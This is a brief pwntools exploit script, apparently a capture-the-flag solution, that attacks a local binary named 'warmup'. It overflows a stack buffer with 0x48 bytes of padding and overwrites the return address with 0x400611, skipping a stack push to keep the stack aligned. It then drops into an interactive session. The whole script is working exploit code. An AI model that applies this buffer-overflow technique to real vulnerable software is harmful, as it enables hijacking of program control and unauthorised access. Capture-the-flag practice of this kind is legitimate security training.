from pwn import *

target = process("./warmup")
# gdb.attach(target, gdbscript = 'b *0x4006a3')
# Skip extra stack push to ensure stack alignment
payload = b"0" * 0x48 + p64(0x400611)

target.sendline(payload)
target.interactive()